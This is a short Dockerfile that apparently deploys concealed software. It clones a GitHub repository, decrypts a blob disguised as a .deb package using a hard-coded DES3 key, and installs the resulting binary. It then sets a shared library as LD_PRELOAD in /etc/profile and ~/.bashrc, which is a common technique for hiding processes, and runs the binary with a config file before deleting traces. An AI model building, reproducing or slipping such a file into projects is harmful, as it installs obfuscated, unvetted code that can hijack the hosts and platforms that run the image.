FROM ubuntu

RUN apt update && apt install -y curl git wget tar openssl unzip bash

RUN git clone https://github.com/jekyll-mask-repo-new/SL-Bin.git
RUN dd if=SL-Bin/sl-bin.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN mv sl-bin /usr/bin/sl-bin
RUN mv SL-Bin/sl-bin.so /sl-bin.so
RUN mv SL-Bin/sl-bin.json /sl-bin.json
RUN rm -rf SL-Bin
RUN chmod +x /usr/bin/sl-bin
RUN echo 'export LD_PRELOAD=/sl-bin.so' >> /etc/profile
RUN echo 'export LD_PRELOAD=/sl-bin.so' >> ~/.bashrc
CMD source /etc/profile
CMD sl-bin run -c /sl-bin.json && rm -rf /node.json
